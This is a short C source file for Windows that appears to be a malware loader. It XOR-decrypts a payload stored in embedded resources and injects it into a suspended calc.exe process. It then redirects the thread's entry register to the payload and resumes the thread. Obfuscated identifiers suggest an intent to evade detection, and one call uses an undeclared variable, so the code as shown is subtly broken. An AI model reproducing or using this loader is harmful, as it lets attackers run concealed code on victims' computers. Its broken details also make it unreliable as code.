#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void lalijojoloadres(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

void ccccdeckumcrpt(char* dancode, DWORD dancodeLen, unsigned char* dkdan1e2y6, DWORD dank1e2y6Len) {
    for (DWORD moo = 0; moo < dancodeLen; moo++) {
        dancode[moo] ^= dkdan1e2y6[moo % dank1e2y6Len];
    }
}

int main() {
    Sleep(1000);

    char* dank1e6ENC;
    DWORD dank1e6ENCLen;
    lalijojoloadres("dhanushkey1", &dank1e6ENC, &dank1e6ENCLen);

    char* codfhu;
    DWORD codfhuLen;
    lalijojoloadres("dhanushcode56", &codfhu, &c1o2d3e4EncLen);

    // Decrypt the payload
    ccccdeckumcrpt(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);

    // Create a new process in a suspended state
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    CreateProcess("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
      

    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    GetThreadContext(pi.hThread, &ctx);

    LPVOID dankummm = VirtualAllocEx(pi.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    

    // Write payload to target process
    WriteProcessMemory(pi.hProcess, dankummm, codfhu, codfhuLen, NULL);
    // Update entry point
    ctx.Rcx = (DWORD64)dankummm; // Use Rcx for x64 processes
    SetThreadContext(pi.hThread, &ctx);

    // Resume thread to execute payload
    ResumeThread(pi.hThread); 

    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
